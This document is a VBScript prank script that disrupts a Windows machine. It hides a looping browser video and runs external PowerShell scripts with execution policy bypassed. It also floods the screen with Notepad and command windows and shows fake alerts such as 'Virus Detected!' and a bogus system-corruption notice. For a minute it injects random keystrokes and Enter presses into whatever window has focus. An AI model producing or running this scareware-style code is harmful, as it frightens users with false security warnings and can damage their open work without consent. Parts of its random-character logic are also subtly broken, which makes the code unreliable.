Set WshShell = CreateObject("WScript.Shell")
Set ie = CreateObject("InternetExplorer.Application")

' Open YouTube in a hidden browser with loop enabled (background chaos music)
ie.Visible = False
ie.Navigate "https://www.youtube.com/embed/uLghjAKpBMU?autoplay=1&loop=1&playlist=uLghjAKpBMU"

' Start glitch effect using PowerShell (instant chaos)
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Start PowerShell script to shake windows
WshShell.Run "powershell -ExecutionPolicy Bypass -File shake_windows.ps1", 0, False

' Open 100 Notepad windows, one per second
For i = 1 To 100
    WshShell.Run "notepad", 0, False
    WScript.Sleep 1000 ' Opens one per second
Next

' Error message flood (random locations, one per second)
For i = 1 To 100
    Randomize
    errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")
    randError = errorMessages(Int(Rnd * UBound(errorMessages)))

    iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
    randIcon = iconTypes(Int(Rnd * 4))

    ' Launch error box at random screen positions
    WshShell.Run "mshta vbscript:msgbox(""" & randError & """, " & randIcon & ", ""System Alert"")", 0, False
    WScript.Sleep 1000 ' Opens one per second
Next

' Start fake system diagnostics (flashing CMD windows)
For i = 1 To 50
    WshShell.Run "cmd /c echo System Critical Failure Detected & timeout 1", 0, False
Next

' Simulated keyboard ghost typing (flooding random characters)
startTime = Timer
Do While Timer - startTime < 60
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text
    For i = 1 To 50 ' Increased spam rate to 50 characters per second
        output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Fake Windows repair screen (pop-up simulation)
WshShell.Run "mshta vbscript:msgbox(""Windows has detected critical corruption. Restarting System Repair..."", vbCritical, ""System Recovery"")", 0, False

